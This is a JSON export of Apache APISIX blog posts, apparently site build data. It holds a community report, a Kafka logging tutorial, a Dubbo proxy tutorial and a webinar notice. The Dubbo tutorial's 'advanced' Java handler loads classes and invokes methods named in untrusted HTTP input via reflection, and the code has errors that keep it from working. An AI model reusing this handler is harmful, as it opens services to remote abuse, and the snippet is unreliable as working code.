convenience for subsequent feature iterations and maintenance.\\n\\n## Summary\\n\\nWe hope that this series of user cases will provide some ideas and directions for you in the process of gateway selection.We hope that this series of user cases will provide some ideas and directions for you in the gateway selection process.\\n\\nAt the same time, Apache APISIX also welcomes users who are using APISIX to actively participate in sharing related user cases and practices, and feel free to start discussions in [GitHub Discussions](https://github.com/apache/apisix/discussions) or communicate via [mailing list](https://apisix.apache.org/zh/docs/general/join)."},{"id":"Biweekly Report (Jan 1 - Jan 16)","metadata":{"permalink":"/blog/2022/01/19/weekly-report-0116","source":"@site/blog/2022/01/19/weekly-report-0116.md","title":"Biweekly Report (Jan 1 - Jan 16)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX.","date":"2022-01-19T00:00:00.000Z","formattedDate":"January 19, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.985,"truncated":true,"authors":[],"prevItem":{"title":"The Practice of Public Gateway in CDN Scenario from UPYUN","permalink":"/blog/2022/01/20/upyun-public-gateway-usecase"},"nextItem":{"title":"APISIX integrate with Kafka for real-time log monitoring","permalink":"/blog/2022/01/17/apisix-kafka-integration"}},"content":"> From 1.1 to 1.16, 29 contributors submitted 81 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1642497489518-269539d9-69d3-4613-90a1-5e4f272918e9.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1642497489537-a7a736dd-fadd-4d67-a9d2-ad22b9d3c090.png)\\n\\n## Good first issue\\n\\n### Issue #6078\\n\\n**Link**: https://github.com/apache/apisix/issues/6078\\n\\n**Issue description**:\\n\\nUse plugin redirect for http_to_https,the browser access unlimited 301.The reason I found is that our APISIX behind a proxy that responsed for decrypted the TLS and proxied always HTTP scheme to APISIX. Let\'s see the redirect plugin code:\\n\\n```Lua\\nif conf.http_to_https and ctx.var.scheme == \\"http\\" then\\n-- ignore\\nend\\n```\\n\\nIt will makes the redirect loop apparently. The resolution is patching this plugin just like:\\n\\n```Lua\\nlocal proxy_proto = core.request.header(ctx, \\"x-forwarded-proto\\")\\nlocal _scheme = proxy_proto and proxy_proto or ctx.var.scheme\\nif conf.http_to_https and _scheme == \\"http\\" then\\n-- ignore\\nend\\n```\\n\\n### Issue #5915\\n\\n**Link**: https://github.com/apache/apisix/issues/5915\\n\\n**Issue description**:\\n\\nSuppose I have two fields, `include_resp_body` as the switch, `resp_limit_size` as the limit size. After configuring these two parameters, if resp_body exceeds the size of resp_limit_size, resp_body will not be recorded in the log. The same is true for req_body.\\n\\nWe can truncate oversized request and response bodies based on limit size.\\n\\n## Highlights of Recent Features\\n\\n- [Support TLS over TCP upstream](https://github.com/apache/apisix/pull/6030)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [Support hide the authentication header in basic-auth with a config](https://github.com/apache/apisix/pull/6039)\uff08Contributor: [mangoGoForward](https://github.com/mangoGoForward)\uff09\\n\\n- [Set proxy_request_buffering dynamically](https://github.com/apache/apisix/pull/6075)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [Mqtt supports load balancing by client id](https://github.com/apache/apisix/pull/6079)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [Add forward-auth plugin](https://github.com/apache/apisix/pull/6037)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [Support gRPC-Web Proxy](https://github.com/apache/apisix/pull/5964)\uff08Contributor: [shuaijinchao](https://github.com/shuaijinchao)\uff09\\n\\n- [limit-count supports sharing counters between requests](https://github.com/apache/apisix/pull/5984)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [Apache APISIX Integration with Kafka for Efficient Real-Time Log Monitoring](https://apisix.apache.org/blog/2022/01/17/apisix-kafka-integration)\uff1a\\n\\n  Apache APISIX has been providing support for Apache Kafka since version 1.2 with the `kafka-logger` plugin release. `kafka-logger` has been enhanced several times since then to provide very mature and complete functionality. It supports pushing API request logs, request bodies, and response bodies, to a Kafka cluster in JSON format.\\n\\n- [Makes it More Convenient for You to Proxy Dubbo Services in Apache APISIX](https://apisix.apache.org/blog/2022/01/13/how-to-proxy-dubbo-in-apache-apisix)\uff1a\\n\\n  In this article, we introduced how to use Apache APISIX to implement a proxy for Dubbo Service. By introducing the dubbo-proxy plugin, you can build a simpler and more efficient traffic link for the back-end system of Dubbo framework.\\n\\n- [How to build Apache APISIX in ARM Ubuntu](https://apisix.apache.org/blog/2022/01/11/building-apisix-in-ubuntu-for-arm)\uff1a\\n\\n  By reading this article you will learn how to build Apache APISIX (M1 chip environment) in ARM Ubuntu from source code. The ARM Ubuntu system is installed with the help of https://multipass.run/.\\n  \\n- [Using the Apache APISIX proxy gRPC service](https://apisix.apache.org/blog/2021/12/30/apisix-proxy-grpc-service)\uff1a\\n\\n  This article shows you how to proxy client HTTP traffic to the back-end gRPC service via the grpc-transcode plugin in Apache APISIX."},{"id":"APISIX integrate with Kafka for real-time log monitoring","metadata":{"permalink":"/blog/2022/01/17/apisix-kafka-integration","source":"@site/blog/2022/01/17/apisix-kafka-integration.md","title":"APISIX integrate with Kafka for real-time log monitoring","description":"This article describes how to use the kafka-logger plugin with APISIX. Wiht enhancements, the plugin now has mature and complete functions.","date":"2022-01-17T00:00:00.000Z","formattedDate":"January 17, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":4.45,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://avatars.githubusercontent.com/u/8078418?v=4","imageURL":"https://avatars.githubusercontent.com/u/8078418?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Biweekly Report (Jan 1 - Jan 16)","permalink":"/blog/2022/01/19/weekly-report-0116"},"nextItem":{"title":"Makes Convenienter to Proxy Dubbo in Apache APISIX","permalink":"/blog/2022/01/13/how-to-proxy-dubbo-in-apache-apisix"}},"content":"> This article describes how to use the kafka-logger plugin with APISIX. Wiht enhancements, the plugin now has mature and complete functions.\\n\\n\x3c!--truncate--\x3e\\n\\nApache Kafka is an open source stream processing platform managed by Apache, written in Scala and Java. Apache Kafka provides uniformed, high-throughput, low-latency functionality for real-time data processing.\\n\\nApache Kafka\'s persistence layer is essentially a \\"massive publish/subscribe message queue following a distributed transaction logging architecture,\\" making it valuable as an enterprise-class infrastructure for processing streaming data. It is used by thousands of companies for high-performance data pipelines, streaming analytics, data integration, and mission-critical applications.\\n\\n## Implementation: kafka-logger\\n\\nApache APISIX has been providing support for Apache Kafka since version 1.2 with the `kafka-logger` plugin release. `kafka-logger` has been enhanced several times since then to provide very mature and complete functionality. It supports pushing API request logs, request bodies, and response bodies, to a Kafka cluster in JSON format.\\n\\nWhen using `kafka-logger`, users can send a wide range of data and customize the format of the logs sent. `kafka-logger` supports sending logs in a packaged manner in a batch or for automatic retries.\\n\\n## How to use\\n\\n### Step 1: Start Kafka Cluster\\n\\nThis article only demonstrates one way to start the cluster. Please refer to the official documentation for details of other ways to start the cluster.\\n\\n```yaml\\n# Start a cluster with 1 ZooKeeper node and 3 kafka nodes using docker-compose\\n# At the same time, an EFAK is started for data monitoring.\\nversion: \'3\'\\n\\nservices:\\n  zookeeper:\\n    image: confluentinc/cp-zookeeper:6.2.1\\n    hostname: zookeeper\\n    ports:\\n      - \\"2181:2181\\"\\n    environment:\\n      ZOOKEEPER_CLIENT_PORT: 2181\\n      ZOOKEEPER_SERVER_ID: 1\\n      ZOOKEEPER_SERVERS: zookeeper:2888:3888\\n\\n  kafka1:\\n    image: confluentinc/cp-kafka:6.2.1\\n    hostname: kafka1\\n    ports:\\n      - \\"9092:9092\\"\\n    environment:\\n      KAFKA_ADVERTISED_LISTENERS: LISTENER_DOCKER_INTERNAL://kafka1:19092,LISTENER_DOCKER_EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092\\n      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: LISTENER_DOCKER_INTERNAL:PLAINTEXT,LISTENER_DOCKER_EXTERNAL:PLAINTEXT\\n      KAFKA_INTER_BROKER_LISTENER_NAME: LISTENER_DOCKER_INTERNAL\\n      KAFKA_ZOOKEEPER_CONNECT: \\"zookeeper:2181\\"\\n      KAFKA_BROKER_ID: 1\\n      KAFKA_LOG4J_LOGGERS: \\"kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO\\"\\n    depends_on:\\n      - zookeeper\\n\\n  kafka2:\\n    image: confluentinc/cp-kafka:6.2.1\\n    hostname: kafka2\\n    ports:\\n      - \\"9093:9093\\"\\n    environment:\\n      KAFKA_ADVERTISED_LISTENERS: LISTENER_DOCKER_INTERNAL://kafka2:19093,LISTENER_DOCKER_EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9093\\n      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: LISTENER_DOCKER_INTERNAL:PLAINTEXT,LISTENER_DOCKER_EXTERNAL:PLAINTEXT\\n      KAFKA_INTER_BROKER_LISTENER_NAME: LISTENER_DOCKER_INTERNAL\\n      KAFKA_ZOOKEEPER_CONNECT: \\"zookeeper:2181\\"\\n      KAFKA_BROKER_ID: 2\\n      KAFKA_LOG4J_LOGGERS: \\"kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO\\"\\n    depends_on:\\n      - zookeeper\\n\\n\\n  kafka3:\\n    image: confluentinc/cp-kafka:6.2.1\\n    hostname: kafka3\\n    ports:\\n      - \\"9094:9094\\"\\n    environment:\\n      KAFKA_ADVERTISED_LISTENERS: LISTENER_DOCKER_INTERNAL://kafka3:19094,LISTENER_DOCKER_EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9094\\n      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: LISTENER_DOCKER_INTERNAL:PLAINTEXT,LISTENER_DOCKER_EXTERNAL:PLAINTEXT\\n      KAFKA_INTER_BROKER_LISTENER_NAME: LISTENER_DOCKER_INTERNAL\\n      KAFKA_ZOOKEEPER_CONNECT: \\"zookeeper:2181\\"\\n      KAFKA_BROKER_ID: 3\\n      KAFKA_LOG4J_LOGGERS: \\"kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO\\"\\n    depends_on:\\n      - zookeeper\\n\\n  efak:\\n    image: nickzurich/kafka-eagle:2.0.9\\n    hostname: efak\\n    ports:\\n      - \\"8048:8048\\"\\n    depends_on:\\n      - kafka1\\n      - kafka2\\n      - kafka3\\n```\\n\\n### Step 2: Create Topic\\n\\nNext we create the `test Topic` to collect logs.\\n\\n![test Topic](https://static.apiseven.com/202108/1642390784736-562187ed-ade9-4a2f-96e1-c79556f9dd7d.png)\\n\\n### Step 3: Create Routing and Enable Plugin\\n\\nThe following commands allow you to create routes and enable the `kafka-logger` plugin.\\n\\n```shell\\ncurl -XPUT \'http://127.0.0.1:9080/apisix/admin/routes/r1\' \\\\\\n--header \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n--header \'Content-Type: application/json\' \\\\\\n--data-raw \'{\\n    \\"uri\\": \\"/*\\",\\n    \\"plugins\\": {\\n        \\"kafka-logger\\": {\\n            \\"batch_max_size\\": 1,\\n            \\"broker_list\\": {\\n                \\"127.0.0.1\\": 9092\\n            },\\n            \\"disable\\": false,\\n            \\"kafka_topic\\": \\"test\\",\\n            \\"producer_type\\": \\"sync\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"httpbin.org:80\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    }\\n}\'\\n```\\n\\nThe above code configures the `kafka broker` address, the target Topic, the production mode for synchronization, and the maximum number of logs to be included in each batch. Here we can start by setting `batch_max_size` to 1, i.e. write one message to Kafka for every log produced.\\n\\nWith the above settings, it is possible to send the logs of API requests under the `/*` path to Kafka.\\n\\n### Step 4: Send Requests\\n\\nNext, we send some requests through the API and record the number of requests.\\n\\n```shell\\n# Send 10 requests to API\\ncurl http://127.0.0.1:9080/get\\n```\\n\\nAs you can see in the figure below, some log messages have been written to the `test topic` we created. If you click to view the log content, you can see that the logs of the API requests made above have been written.\\n\\n![Send Requests-1](https://static.apiseven.com/202108/1642390828394-721eccfa-ab02-4f8f-a0d8-8039e0eaabc1.png)\\n\\n![Send Requests-2](https://static.apiseven.com/202108/1642390874028-89683dfb-ab16-48cd-92de-496cc60df3b5.png)\\n\\n#### Customize the logging structure\\n\\nOf course, we can also set the structure of the log data sent to Kafka during use through the metadata configuration provided by the `kafka-logger` plugin. By setting the `log_format` data, you can control the type of data sent.\\n\\nFor example, `$host` and `$time_iso8601` in the following data are built-in variables provided by Nginx; APISIX variables such as `$route_id` and `$service_id` are also supported.\\n\\n```shell\\ncurl -XPUT \'http://127.0.0.1:9080/apisix/admin/plugin_metadata/kafka-logger\' \\\\\\n--header \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n--header \'Content-Type: application/json\' \\\\\\n--data-raw \'{\\n    \\"log_format\\": {\\n        \\"host\\": \\"$host\\",\\n        \\"@timestamp\\": \\"$time_iso8601\\",\\n        \\"client_ip\\": \\"$remote_addr\\",\\n        \\"route_id\\": \\"$route_id\\"\\n    }\\n}\'\\n```\\n\\nA simple test by sending a request shows that the above logging structure settings have taken effect. Currently, Apache APISIX provides a variety of log format templates, which provides great flexibility in configuration, and more details on log format can be found in [Apache APISIX documentation](https://apisix.apache.org/docs/apisix/plugins/kafka-logger#metadata).\\n\\n![customize the logging structure](https://static.apiseven.com/202108/1642390899127-d1eb560a-499e-4a9f-9227-4063ba711e2d.png)\\n\\n### Turn off the plugin\\n\\nIf you are done using the plugin, simply remove the kafka-logger plugin-related configuration from the route configuration and save it to turn off the plugin on the route. Thanks to the dynamic advantage of Apache APISIX, the process of turning on and off the plugin does not require restarting Apache APISIX, which is very convenient.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {},\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n## Summary\\n\\nIn this article, we have introduced the feature preview and usage steps of the kafka-logger plugin. For more information about the kafka-logger plugin and the full configuration list, you can refer to the official documentation.\\n\\nWe are also currently working on other logging plugins to integrate with more related services. If you\'re interested in such integration projects, feel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions) or communicate via the [mailing list](https://apisix.apache.org/zh/docs/general/join)."},{"id":"Makes Convenienter to Proxy Dubbo in Apache APISIX","metadata":{"permalink":"/blog/2022/01/13/how-to-proxy-dubbo-in-apache-apisix","source":"@site/blog/2022/01/13/how-to-proxy-dubbo-in-apache-apisix.md","title":"Makes Convenienter to Proxy Dubbo in Apache APISIX","description":"This article describes how to use APISIX to implement a proxy for Dubbo. You can use dubbo-proxy plugin to build backend system of Dubbo framework.","date":"2022-01-13T00:00:00.000Z","formattedDate":"January 13, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":6.285,"truncated":true,"authors":[{"name":"Yong Qian","title":"Author","url":"https://github.com/nic-6443","image_url":"https://avatars.githubusercontent.com/u/22141303?v=4","imageURL":"https://avatars.githubusercontent.com/u/22141303?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"APISIX integrate with Kafka for real-time log monitoring","permalink":"/blog/2022/01/17/apisix-kafka-integration"},"nextItem":{"title":"Webinar | From API to Database","permalink":"/blog/2022/01/11/apisix-with-shardingsphere-meetup"}},"content":"> This article describes how to use APISIX to implement a proxy for Dubbo. You can use dubbo-proxy plugin to build backend system of Dubbo framework.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\n[Apache Dubbo](https://dubbo.apache.org/en/) is a MicroService development framework open sourced by Alibaba and donated to Apache, which provides two key capabilities of RPC communication and microservice governance. It has not only been validated by Ali\'s massive traffic in e-commerce scenario, but also been widely implemented in domestic technology companies.\\n\\nIn practical application scenarios, Apache Dubbo is generally used as the implementation framework for RPC calls between back-end systems, and when HTTP interfaces need to be provided to the front-end, the Dubbo Service is packaged as an HTTP interface through a \\"glue layer\\" and then delivered to the front-end system.\\n\\n[Apache APISIX](https://apisix.apache.org/) is the top open source project of Apache Software Foundation and the most active open source gateway project today. As a dynamic, real-time, high-performance open source API gateway, Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, grayscale publishing, service meltdown, authentication, observability, and more.\\n\\nBenefiting from the advantages of Apache Dubbo application scenarios, Apache APISIX is based on the open source project tengine/mod_dubbo module to equip Apache Dubbo services with HTTP gateway capabilities. Dubbo Service can be easily published as an HTTP service via the dubbo-proxy plugin.\\n\\n![Architecture Diagram](https://static.apiseven.com/202108/1641873664933-65d02cb3-ec3e-4b95-945d-91cfb8106751.png)\\n\\n## How to use\\n\\n### Getting Started: Installation and Use\\n\\n> Here we recommend using the Apache APISIX version 2.11 image for installation. This version of APISIX-Base has the Dubbo module compiled by default, so you can use the `dubbo-proxy` plugin directly.\\n\\nIn the next steps, we will use the [`dubbo-samples`](https://github.com/apache/dubbo-samples) project for a partial demonstration. This project is a demo application implemented using Apache Dubbo, and in this article we use one of the sub-modules as the Dubbo Provider.\\n\\nBefore we get into the action, let\'s take a brief look at the definition, configuration, and implementation of the Dubbo interface.\\n\\n#### Interface implementation\\n\\n```java\\npublic interface DemoService {\\n\\n    /**\\n     * standard samples dubbo infterace demo\\n     * @param context pass http infos\\n     * @return Map<String, Object></> pass to response http\\n     **/\\n    Map<String, Object> apisixDubbo(Map<String, Object> httpRequestContext);\\n}\\n```\\n\\nAs shown above, the Dubbo interface is defined in a fixed way. The `Map` of method parameters represents the information passed by APISIX to the Dubbo Provider about the HTTP request (e.g. header, body, ...). The `Map` of the method return value indicates how the Dubbo Provider passes some information to APISIX about the HTTP response to be returned.\\n\\nAfter the interface information, the DemoService can be published via XML configuration.\\n\\n```xml\\n\x3c!-- service implementation, as same as regular local bean --\x3e\\n<bean id=\\"demoService\\" class=\\"org.apache.dubbo.samples.provider.DemoServiceImpl\\"/>\\n\\n\x3c!-- declare the service interface to be exported --\x3e\\n<dubbo:service interface=\\"org.apache.dubbo.samples.apisix.DemoService\\" ref=\\"demoService\\"/>\\n```\\n\\nAfter the above configuration, the Consumer can access the `apisixDubbo` method through `org.apache.dubbo.samples.apisix.DemoService` The specific interface implementation is as follows.\\n\\n```java\\npublic class DemoServiceImpl implements DemoService {\\n    @Override\\n    public Map<String, Object> apisixDubbo(Map<String, Object> httpRequestContext) {\\n        for (Map.Entry<String, Object> entry : httpRequestContext.entrySet()) {\\n            System.out.println(\\"Key = \\" + entry.getKey() + \\", Value = \\" + entry.getValue());\\n        }\\n\\n        Map<String, Object> ret = new HashMap<String, Object>();\\n        ret.put(\\"body\\", \\"dubbo success\\\\n\\"); // http response body\\n        ret.put(\\"status\\", \\"200\\"); // http response status\\n        ret.put(\\"test\\", \\"123\\"); // http response header\\n\\n        return ret;\\n    }\\n}\\n```\\n\\n:::note\\nIn the above code, `DemoServiceImpl` prints the received `httpRequestContext` and describes the HTTP response to the Dubbo request by returning a Map object with the specified Key.\\n:::\\n\\n#### Operation steps\\n\\n1. Start [`dubbo-samples`](https://github.com/apache/dubbo-samples/tree/master/dubbo-samples-tengine#install-dubbo).\\n2. Enable the `dubbo-proxy` plugin in the `config.yaml` file.\\n\\n```yaml\\n# Add this in config.yaml\\nplugins:\\n  - ... # plugin you need\\n  - dubbo-proxy\\n```\\n\\n3. Create an Upstream that points to the Dubbo Provider.\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/upstreams/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"nodes\\": {\\n        \\"127.0.0.1:20880\\": 1\\n    },\\n    \\"type\\": \\"roundrobin\\"\\n}\'\\n```\\n\\n4. Expose an HTTP route for the DemoService.\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"host\\": \\"example.org\\"\\n    \\"uris\\": [\\n        \\"/demo\\"\\n    ],\\n    \\"plugins\\": {\\n        \\"dubbo-proxy\\": {\\n            \\"service_name\\": \\"org.apache.dubbo.samples.apisix.DemoService\\",\\n            \\"service_version\\": \\"0.0.0\\",\\n            \\"method\\": \\"apisixDubbo\\"\\n        }\\n    },\\n    \\"upstream_id\\": 1\\n}\'\\n```\\n\\n5. Use the curl command to request Apache APISIX and view the returned results.\\n\\n```shell\\ncurl http://127.0.0.1:9080/demo  -H \\"Host: example.org\\"  -X POST --data \'{\\"name\\": \\"hello\\"}\'\\n\\n< HTTP/1.1 200 OK\\n< Date: Sun, 26 Dec 2021 11:33:27 GMT\\n< Content-Type: text/plain; charset=utf-8\\n< Content-Length: 14\\n< Connection: keep-alive\\n< test: 123\\n< Server: APISIX/2.11.0\\n<\\ndubbo success\\n```\\n\\n:::note\\nThe above code returns the `test: 123` Header, and the `dubbo success` string as the body. This is the same as what we expected in the `DemoServiceImpl` code.\\n:::\\n\\n6. You can view the logs of the Dubbo Provider.\\n\\n```\\nKey = content-length, Value = 17\\nKey = host, Value = example.org\\nKey = content-type, Value = application/x-www-form-urlencoded\\nKey = body, Value = [B@70754265\\nKey = accept, Value = */*\\nKey = user-agent, Value = curl/7.80.0\\n```\\n\\n:::note\\nThe Header and Body of the HTTP request are available through the `httpRequestContext`, where the Header is used as a Map element, while the Body has a fixed string \\"body\\" as the Key value and a Byte array as the Value.\\n:::\\n\\n### Advanced: Complex Scenario Example\\n\\nAs you can see in the simple use case above, we do publish Dubbo Service as an HTTP service via Apache APISIX, but there are obvious limitations in its use. For example, the parameters and return values of the interface must be `Map<String, Object>`.\\n\\nSo, how do you expose the HTTP service through Apache APISIX if there is an interface in your project that is already defined, but does not meet the above restrictions?\\n\\n#### Operation steps\\n\\nFor the above scenario, we can use the HTTP Request Body to describe the Service and Method to be invoked and the corresponding parameters, and then use the reflection mechanism of Java to realize the invocation of the target method. Finally, the return value is serialized to JSON and written to the HTTP Response Body.\\n\\nThis will further enhance the \\"HTTP to Dubbo\\" capability of Apache APISIX and apply it to all existing Dubbo services. For details, see the following.\\n\\n1. Add a Dubbo Service for existing projects to handle HTTP to Dubbo conversions in a unified way.\\n\\n```java\\npublic class DubboInvocationParameter {\\n    private String type;\\n    private String value;\\n}\\n\\npublic class DubboInvocation {\\n    private String service;\\n    private String method;\\n    private DubboInvocationParameter[] parameters;\\n}\\n\\npublic interface HTTP2DubboService {\\n    Map<String, Object> invoke(Map<String, Object> context)  throws Exception;\\n}\\n\\n\\n@Component\\npublic class HTTP2DubboServiceImpl implements HTTP2DubboService {\\n\\n    @Autowired\\n    private ApplicationContext appContext;\\n\\n    @Override\\n    public Map<String, Object> invoke(Map<String, Object> context) throws Exception {\\n        DubboInvocation invocation = JSONObject.parseObject((byte[]) context.get(\\"body\\"), DubboInvocation.class);\\n        Object[] args = new Object[invocation.getParameters().size()];\\n        for (int i = 0; i < args.length; i++) {\\n            DubboInvocationParameter parameter = invocation.getParameters().get(i);\\n            args[i] = JSONObject.parseObject(parameter.getValue(), Class.forName(parameter.getType()));\\n        }\\n\\n        Object svc = appContext.getBean(Class.forName(invocation.getService()));\\n        Object result = svc.getClass().getMethod(invocation.getMethod()).invoke(args);\\n        Map<String, Object> httpResponse = new HashMap<>();\\n        httpResponse.put(\\"status\\", 200);\\n        httpResponse.put(\\"body\\", JSONObject.toJSONString(result));\\n        return httpResponse;\\n    }\\n\\n}\\n```\\n\\n2. Initiate the relevant call with the following command request.\\n\\n```shell\\ncurl http://127.0.0.1:9080/demo  -H \\"Host: example.org\\"  -X POST --data \'\\n{\\n    \\"service\\": \\"org.apache.dubbo.samples.apisix.DemoService\\",\\n    \\"method\\": \\"createUser\\",\\n    \\"parameters\\": [\\n        {\\n            \\"type\\": \\"org.apache.dubbo.samples.apisix.User\\",\\n            \\"value\\": \\"{\'name\': \'hello\'}\\"\\n        }\\n    ]\\n}\'\\n```\\n\\n## Summary\\n\\nIn this article, we introduced how to use Apache APISIX to implement a proxy for Dubbo Service. By introducing the `dubbo-proxy` plugin, you can build a simpler and more efficient traffic link for the back-end system of Dubbo framework.\\n\\nWe hope that the above steps and use cases will provide you with ideas for using it in relevant scenarios. For more information about the `dubbo-proxy` plugin, please refer to the [official documentation](https://apisix.apache.org/docs/apisix/plugins/dubbo-proxy/)."},{"id":"Webinar | From API to Database","metadata":{"permalink":"/blog/2022/01/11/apisix-with-shardingsphere-meetup","source":"@site/blog/2022/01/11/apisix-with-shardingsphere-meetup.md","title":"Webinar | From API to Database","description":"On January 15th, the Apache APISIX community is joining forces with the Apache Shardingsphere community to bring you an online sharing session.","date":"2022-01-11T00:00:00.000Z","formattedDate":"January 11, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.69,"truncated":true,"authors":[],"prevItem":{"title":"Makes Convenienter to Proxy Dubbo in Apache APISIX","permalink":"/blog/2022/01/13/how-to-proxy-dubbo-in-apache-apisix"},"nextItem":{"title":"How to build APISIX in ARM Ubuntu","permalink":"/blog/2022/01/11/building-apisix-in-ubuntu-for-arm"}},"content":"> On January 15th, the Apache APISIX community is joining forces with the Apache Shardingsphere community to bring you an online sharing session.\\n\\n\x3c!--truncate--\x3e\\n\\n![Meetup post](https://static.apiseven.com/202108/1641871137255-251807b8-594d-46bf-b252-2393ea866e48.png)\\n\\n## Topics\\n\\n### The Secrets of CyborgFlow: How 3 Apache Top-Level Projects Jointly Built a Stress Testing Project\\n\\n#### Speaker\\n\\nSheng Wu, Apache SkyWalking Founder\\n\\n#### Topic Details\\n\\nIn this speech, we will introduce CyborgFlow, a stress testing tool jointly released by Apache ShardingSphere, Apache Skywalk and Apache APISIX. We\'ll share: - What is CyborgFlow\uff1f- How do the three Top-Level Projects Work Together to Create the Tool that Supports Full-link Stress Testing- How to Use Cyborg to Centralize Full-link Flow and Data Analysis and Decrease Costs- How to Use CyborgFlow to Maximize Data Asset Analysis and Managemenet Speed\\n\\n### Apache APISIX Ingress\uff1aFacilitates Database Migration to the Cloud\\n\\n#### Speaker\\n\\nJintao Zhang, API7.ai Cloud Native Specialist\uff0cApache APISIX Committer\uff0cKubernetes ingress-NGINX Reviewer\\n\\n#### Topic Details\\n\\n- What are the Pain Points Faced by Cloud Databases?\\n- Apache APISIX Ingress & Observable Database Proxy\\n- How Apache APISIX Ingress Empowers Cloud Databases\\n\\n### Apache ShardingSphere Shadow DB & Its Application in CyborgFlow\\n\\n#### Speaker\\n\\nYang Hou, SphereEx-Middleware Engineer, Apache ShardingSphere Contributor\\n\\n#### Topic Details\\n\\n- Apache ShardingSphere Shadow DB\'s Architecture Design\\n- Application Scenarios for Apache ShardingSphere Shadow DB- Shadow DB\'s Data Routing Capability in CyborgFlow\\n\\n### Apache APISIX: Multiple Database Protocols Support & Observability\\n\\n#### Speaker\\n\\nJinchao Shuai, API7.ai Engineer, Apache APISIX PMC Member\\n\\n#### Topic Details\\n\\n- Apache APISIX Introduction and Architecture Design\\n- Apache APISIX Observability Capabilities\\n- Apache APISIX\'s Multiple Database Protocols Support (xRPC)\\n- Apache APISIX: Network Traffic Analysis Application Scenario and Multi-Language Support Ecosystem\\n\\n### ShardingSphere\'s DistSQL:based Distributed Database Management\\n\\n#### Speaker\\n\\nChengxiang Lan, SphereEx - Engineer & Apache ShardingSphere Contributor\\n\\n#### Topic Details\\n\\n- An Introduction to DistSQL\\n- DistSQL Application to Different Business Scenarios\\n- DistSQL Application to Database Management\\n\\n## How to participate\\n\\nScan the code to follow Apache APISIX\'s video account below. We look forward to meeting you on the afternoon of January 15th!\\n\\n![QR code](https://static.apiseven.com/202108/1639618627132-2ce4f183-4d3f-40ca-ae5f-397a48f650ae.png)"},{"id":"How to build APISIX in ARM Ubuntu","metadata":{"permalink":"/blog/2022/01/11/building-apisix-in-ubuntu-for-arm","source":"@site/blog/2022/01/11/building-apisix-in-ubuntu-for-arm.md","title":"How to build APISIX in ARM Ubuntu","description":"By reading this article, you will learn how to build Apache APISIX (M1 chip environment) in ARM Ubuntu from source 